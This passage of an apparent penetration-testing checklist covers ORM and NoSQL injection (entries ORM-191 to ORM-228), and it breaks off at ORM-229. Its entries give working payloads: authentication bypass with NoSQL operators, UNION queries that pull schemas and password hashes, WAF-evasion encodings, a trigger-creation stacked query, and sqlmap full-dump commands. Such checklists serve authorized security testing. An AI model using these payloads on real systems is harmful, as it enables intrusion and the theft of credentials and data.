**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-191 — Sequelize - attributes Injection
**Test Category:** Sequelize Advanced · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sequelize endpoints

**Test Steps:** Inject into attributes parameter to select sensitive fields

**Expected Result:** Sensitive fields returned in response

**Payload Example:**

```
attributes[]=id&attributes[]=password&attributes[]=secret
```

**Impact:** Advanced Sequelize injection: nested operators &amp; raw-query exposure

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-192 — NoSQL + ORM - JSON Injection via Content-Type
**Test Category:** NoSQL ORM · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any ORM endpoint (NodeJS)

**Test Steps:** Change Content-Type to application/json and send operator objects instead of strings

**Expected Result:** ORM interprets JSON operators

**Payload Example:**

```
password[$gt]= → converted to {password: {$gt: ''}}
```

**Impact:** NoSQL ORM operator injection ($ne/$gt/$where): authN bypass &amp; exfiltration

**Tools:** Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-193 — NoSQL + ORM - Query Parameter Array Injection
**Test Category:** NoSQL ORM · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any ORM endpoint (NodeJS)

**Test Steps:** Send array syntax in query parameters that gets parsed as MongoDB operators

**Expected Result:** Query operator injection via array params

**Payload Example:**

```
username=admin&password[$ne]=wrong
```

**Impact:** NoSQL ORM operator injection ($ne/$gt/$where): authN bypass &amp; exfiltration

**Tools:** Burp Suite, NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-194 — ORM Injection via XML/SOAP
**Test Category:** Alternate Input Vectors · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** If API accepts XML/SOAP and maps to ORM, inject in XML values

**Expected Result:** ORM injection via XML input

**Payload Example:**

```
<username>' OR 1=1--</username>
```

**Impact:** ORM injection via headers/JSON/nested params (non-obvious vectors)

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-195 — ORM Injection via Multipart Form Data
**Test Category:** Alternate Input Vectors · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject ORM payloads in multipart form data fields

**Expected Result:** ORM injection via multipart field

**Payload Example:**

```
Content-Disposition: form-data; name="username"\r\n\r\n' OR 1=1--
```

**Impact:** ORM injection via headers/JSON/nested params (non-obvious vectors)

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-196 — ORM Injection via WebSocket Messages
**Test Category:** Alternate Input Vectors · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WebSocket endpoints

**Test Steps:** Inject ORM payloads in WebSocket JSON messages

**Expected Result:** ORM injection via WebSocket

**Payload Example:**

```
{"action":"search","query":"' OR 1=1--"}
```

**Impact:** ORM injection via headers/JSON/nested params (non-obvious vectors)

**Tools:** Burp Suite WebSocket, wscat

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-197 — ORM Injection via gRPC Fields
**Test Category:** Alternate Input Vectors · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** gRPC endpoints

**Test Steps:** Inject ORM payloads in gRPC message fields

**Expected Result:** ORM injection via gRPC

**Payload Example:**

```
Use grpcurl to send malicious field values
```

**Impact:** ORM injection via headers/JSON/nested params (non-obvious vectors)

**Tools:** grpcurl, grpcui

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-198 — ORM Injection - WAF Bypass using ORM-Specific Syntax
**Test Category:** WAF Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Use ORM-specific query syntax that WAFs don't recognize as SQL

**Expected Result:** WAF bypassed using HQL/DQL/JPQL syntax

**Payload Example:**

```
HQL: FROM User u WHERE u.name=' OR u.role='admin
```

**Impact:** WAF evasion delivering the ORM-injection payload to the backend

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-199 — ORM Injection - WAF Bypass using Alternative Encodings
**Test Category:** WAF Bypass · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Use hex encoding, char functions, alternative string representations

**Expected Result:** Encoded payload bypasses WAF

**Payload Example:**

```
0x61646d696e instead of 'admin' / CHAR(97,100,109,105,110)
```

**Impact:** WAF evasion delivering the ORM-injection payload to the backend

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-200 — ORM Injection - WAF Bypass using HTTP/2 Specific Features
**Test Category:** WAF Bypass · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Use HTTP/2 pseudo-headers or binary framing to bypass WAF inspection

**Expected Result:** WAF fails to inspect HTTP/2 properly

**Payload Example:**

```
Send injection in HTTP/2 binary frame
```

**Impact:** WAF evasion delivering the ORM-injection payload to the backend

**Tools:** Burp Suite (HTTP/2), h2csmuggler

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-201 — ORM Injection - Combining Multiple Vectors
**Test Category:** Chained Attack · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Chain ORM injection with other vulns (SSRF, XXE, deserialization)

**Expected Result:** Compound attack achieves greater impact

**Payload Example:**

```
ORM injection → file write → RCE
```

**Impact:** Chained ORM-injection primitive escalating to broader compromise

**Tools:** Multiple tools

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-202 — ORM Injection - Automation with sqlmap Custom Tamper
**Test Category:** Automation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Create sqlmap tamper scripts for ORM-specific syntax

**Expected Result:** Automated exploitation of ORM injection

**Payload Example:**

```
sqlmap -u URL --tamper=custom_orm_tamper.py
```

**Impact:** Automated ORM-injection detection across endpoints

**Tools:** sqlmap with custom tamper

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-203 — ORM Injection - Automation with Custom Wordlists
**Test Category:** Automation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Use ORM-specific payload wordlists from PayloadsAllTheThings

**Expected Result:** Comprehensive ORM injection testing

**Payload Example:**

```
Use HQL/NoSQL/Django-specific wordlists
```

**Impact:** Automated ORM-injection detection across endpoints

**Tools:** Burp Intruder, ffuf, wfuzz

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-204 — Mass Assignment - Automated Hidden Parameter Discovery
**Test Category:** Automation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All API endpoints

**Test Steps:** Use Arjun/Param Miner to automatically discover hidden ORM model parameters

**Expected Result:** Hidden writable parameters discovered

**Payload Example:**

```
arjun -u URL -m POST
```

**Impact:** Automated ORM-injection detection across endpoints

**Tools:** Arjun, Param Miner

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-205 — ORM Injection - Comprehensive Tool Scan
**Test Category:** Automation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Run sqlmap with all techniques against suspected ORM injection points

**Expected Result:** Automated confirmation and exploitation

**Payload Example:**

```
sqlmap -r request.txt --level=5 --risk=3 --technique=BEUSTQ
```

**Impact:** Automated ORM-injection detection across endpoints

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-206 — ORM Injection - NoSQLMap Automated Scan
**Test Category:** Automation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Run NoSQLMap against NoSQL ORM endpoints

**Expected Result:** Automated NoSQL injection testing

**Payload Example:**

```
nosqlmap -u URL
```

**Impact:** Automated ORM-injection detection across endpoints

**Tools:** NoSQLMap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-207 — HQL Injection - hibernate-specific function injection
**Test Category:** HQL Advanced · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Hibernate endpoints

**Test Steps:** Inject Hibernate-specific functions like str(), year(), month()

**Expected Result:** ORM-specific function executes

**Payload Example:**

```
' AND str(1)='1' AND '1'='1
```

**Impact:** Advanced HQL injection: cross-entity data extraction &amp; query manipulation

**Tools:** Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-208 — ORM Injection - Schema Dump via information_schema
**Test Category:** Data Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Extract complete database schema through confirmed ORM injection

**Expected Result:** Full schema extracted

**Payload Example:**

```
' UNION SELECT table_name,column_name FROM information_schema.columns--
```

**Impact:** Systematic DB data extraction via ORM injection

**Tools:** sqlmap --schema

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-209 — ORM Injection - Password Hash Extraction
**Test Category:** Data Extraction · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Extract password hashes through confirmed ORM injection

**Expected Result:** User password hashes extracted

**Payload Example:**

```
' UNION SELECT username,password FROM users--
```

**Impact:** Systematic DB data extraction via ORM injection

**Tools:** sqlmap --dump -T users

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-210 — ORM Injection - Full Database Dump
**Test Category:** Data Extraction · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Dump entire database through confirmed ORM injection

**Expected Result:** Complete database extracted

**Payload Example:**

```
sqlmap --dump-all
```

**Impact:** Systematic DB data extraction via ORM injection

**Tools:** sqlmap --dump-all

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-211 — ORM Injection - Identify DB User and Privileges
**Test Category:** Post-Exploitation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Identify current database user and their privileges

**Expected Result:** DB user and privileges known

**Payload Example:**

```
' UNION SELECT current_user,NULL-- / sqlmap --current-user --privileges
```

**Impact:** Post-exploitation pivot from ORM injection (files/creds/lateral)

**Tools:** sqlmap --current-user --privileges

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-212 — ORM Injection - Identify Database Version
**Test Category:** Post-Exploitation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Extract database version information

**Expected Result:** DB version identified for targeted attacks

**Payload Example:**

```
' UNION SELECT version(),NULL-- / sqlmap --banner
```

**Impact:** Post-exploitation pivot from ORM injection (files/creds/lateral)

**Tools:** sqlmap --banner

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-213 — ORM Injection - Enumerate Other Databases
**Test Category:** Post-Exploitation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** List all databases accessible to current user

**Expected Result:** All accessible databases enumerated

**Payload Example:**

```
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
```

**Impact:** Post-exploitation pivot from ORM injection (files/creds/lateral)

**Tools:** sqlmap --dbs

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-214 — ORM Injection - Read DB Configuration
**Test Category:** Post-Exploitation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** All ORM endpoints

**Test Steps:** Extract database configuration variables

**Expected Result:** DB config extracted (paths, settings)

**Payload Example:**

```
' UNION SELECT variable_name,variable_value FROM information_schema.global_variables--
```

**Impact:** Post-exploitation pivot from ORM injection (files/creds/lateral)

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-215 — Sequelize - Legacy String-based Operator Injection
**Test Category:** Version-Specific · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sequelize v5 and below

**Test Steps:** Test if old Sequelize versions accept string operator aliases (gt,ne,like)

**Expected Result:** String operators interpreted by Sequelize

**Payload Example:**

```
password[ne]=anything (Sequelize <v5 without operatorsAliases:false)
```

**Impact:** Version-specific ORM CVE/behaviour enabling injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-216 — ActiveRecord - Unsafe Reflection in older Rails
**Test Category:** Version-Specific · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ActiveRecord (Rails &lt;5.2)

**Test Steps:** Test if older Rails versions allow unsafe reflection through params

**Expected Result:** Code execution via ActiveRecord

**Payload Example:**

```
params[:controller].constantize
```

**Impact:** Version-specific ORM CVE/behaviour enabling injection

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-217 — Django ORM - extra() in older Django versions
**Test Category:** Version-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Django &lt;2.0

**Test Steps:** Test extra() which is more commonly used in older Django versions

**Expected Result:** SQL injection via extra()

**Payload Example:**

```
q=1) OR 1=1--
```

**Impact:** Version-specific ORM CVE/behaviour enabling injection

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-218 — ORM Injection Confirmation - Mathematical Expression Test
**Test Category:** Confirmation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject mathematical expressions to confirm interpretation

**Expected Result:** Calculated value used in query (e.g. id=2-1 returns id=1 results)

**Payload Example:**

```
id=2-1 / id=3*1 / id=9/3
```

**Impact:** Confirm ORM injection with a benign deterministic proof

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-219 — ORM Injection Confirmation - String Concatenation Test
**Test Category:** Confirmation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject string concatenation to confirm interpretation

**Expected Result:** Concatenated string treated as single value

**Payload Example:**

```
name=ad'||'min / name=ad'+'min / name=CONCAT('ad','min')
```

**Impact:** Confirm ORM injection with a benign deterministic proof

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-220 — ORM Injection Confirmation - Tautology vs Contradiction
**Test Category:** Confirmation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Compare responses for always-true vs always-false conditions

**Expected Result:** Consistent different responses confirm injection

**Payload Example:**

```
' OR 1=1-- (all results) vs ' OR 1=2-- (no results)
```

**Impact:** Confirm ORM injection with a benign deterministic proof

**Tools:** Burp Suite Comparer

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-221 — ORM Injection Confirmation - Conditional Response Test
**Test Category:** Confirmation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use CASE WHEN to produce different outputs based on conditions

**Expected Result:** Response changes based on CASE condition

**Payload Example:**

```
' AND (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1--
```

**Impact:** Confirm ORM injection with a benign deterministic proof

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-222 — ORM Injection Confirmation - Database-Specific Function Test
**Test Category:** Confirmation · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use DB-specific functions to confirm DB type through ORM

**Expected Result:** Correct DB identified

**Payload Example:**

```
MySQL: @@version / PostgreSQL: version() / MSSQL: @@version / Oracle: banner FROM v$version
```

**Impact:** Confirm ORM injection with a benign deterministic proof

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-223 — ORM Filter Injection - Deep Object Notation
**Test Category:** API-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** REST API with filtering

**Test Steps:** Use deep object notation in query params to inject ORM operators

**Expected Result:** ORM interprets nested filter objects

**Payload Example:**

```
filter[where][role]=admin / filter[where][password][like]=%25
```

**Impact:** API-surface ORM injection via filter/sort/query params

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-224 — ORM Filter Injection - Bracket Notation
**Test Category:** API-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** REST API with filtering

**Test Steps:** Use bracket notation to inject ORM filter conditions

**Expected Result:** Bracket params parsed as ORM conditions

**Payload Example:**

```
users?[where][isAdmin]=true&[include]=secrets
```

**Impact:** API-surface ORM injection via filter/sort/query params

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-225 — ORM Injection via API Versioning Mismatch
**Test Category:** API-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** REST API

**Test Steps:** Test older API versions that may have less ORM input validation

**Expected Result:** Older API version vulnerable

**Payload Example:**

```
GET /api/v1/users?q=' OR 1=1-- (if /api/v2 is patched but /api/v1 isn't)
```

**Impact:** API-surface ORM injection via filter/sort/query params

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-226 — ORM Injection - Race Condition with ORM Transactions
**Test Category:** Advanced · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Send concurrent requests to exploit TOCTOU in ORM transaction handling

**Expected Result:** Race condition in ORM query execution leads to data inconsistency

**Payload Example:**

```
Send 50 concurrent requests to same endpoint
```

**Impact:** Advanced ORM-injection technique escalating impact

**Tools:** Burp Turbo Intruder, race-the-web

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-227 — ORM Injection - Trigger/Event Exploitation
**Test Category:** Advanced · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject SQL that creates or fires database triggers through ORM

**Expected Result:** DB trigger created/fired

**Payload Example:**

```
'; CREATE TRIGGER evil AFTER INSERT ON users FOR EACH ROW EXECUTE...--
```

**Impact:** Advanced ORM-injection technique escalating impact

**Tools:** Burp Suite, manual

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-228 — ORM Injection - Cache Poisoning via Query Manipulation
**Test Category:** Advanced · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint with caching

**Test Steps:** Inject ORM payload that poisons cached query results

**Expected Result:** Cached poisoned results served to other users

**Payload Example:**

```
Inject payload that changes result set which gets cached
```

**Impact:** Advanced ORM-injection technique escalating impact

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-229 — ORM Injection - Verify Fix Completeness
